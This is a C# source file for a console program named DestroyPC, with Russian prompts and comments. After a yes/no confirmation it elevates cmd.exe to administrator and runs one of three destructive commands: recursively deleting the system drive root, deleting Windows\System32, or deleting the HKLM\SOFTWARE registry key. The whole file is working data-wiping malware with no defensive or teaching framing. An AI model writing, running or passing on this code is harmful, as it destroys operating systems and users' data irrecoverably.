using System.Diagnostics;

namespace Project_9;

public static class DestroyPC
{
    /// <summary>
    /// Запуск основной логики
    /// </summary>
    public static void Start()
    {
        try
        {
            Console.WriteLine("Вы запускаете опасную программу. Уверены? (Y - да/N - нет)");
            if (Console.ReadKey().Key == ConsoleKey.Y)
            {
                Console.WriteLine("\n1 - Долгая чистка, 10 минут." +
                                  "\n2 - Поверхностная очистка, 1-2 минуты." +
                                  "\n3 - Очистка реестра, 10-20 секунд.");

                var number = Console.ReadKey();

                if ((number.Key == ConsoleKey.NumPad1 || number.Key == ConsoleKey.D1) ||
                    (number.Key == ConsoleKey.NumPad2 || number.Key == ConsoleKey.D2) ||
                    (number.Key == ConsoleKey.NumPad3 || number.Key == ConsoleKey.D3))
                    Destroy(number);
            }
        }
        catch (Exception e)
        {
            Console.WriteLine(e.Message);
        }
    }

    /// <summary>
    /// Запуск консоли с правами администратора и аргументами для поломки ПК
    /// </summary>
    /// <param name="number">Номер команды</param>
    /// <exception cref="Exception">Если данного номера для команды нет, выброс ошибки</exception>
    private static void Destroy(ConsoleKeyInfo number)
    {
        var arguments = String.Empty;
        
        switch (number.Key)
        {
            case ConsoleKey.D1:
            case ConsoleKey.NumPad1:
            {
                var system = Path.GetPathRoot(Environment.SystemDirectory);
                arguments = $"/C cd {system} && rd {system} /s/q && del {system} /s/q";
                break;
            }

            case ConsoleKey.D2:
            case ConsoleKey.NumPad2:
            {
                var system = Path.GetPathRoot(Environment.SystemDirectory);
                arguments = @$"/C cd {system} && rmdir {system}Windows\System32 /s/q";
                break;
            }

            case ConsoleKey.D3:
            case ConsoleKey.NumPad3:
            {
                arguments = @"/C REG DELETE HKLM\SOFTWARE /f";
                break;
            }

            default:
                throw new Exception("Не верно введен параметр.");
        }
        
        var process = new Process
        {
            StartInfo = new ProcessStartInfo
            {
                FileName = "cmd.exe",
                Verb = "runas",
                Arguments = arguments,
                UseShellExecute = true
            }
        };
        process.Start();
    }
}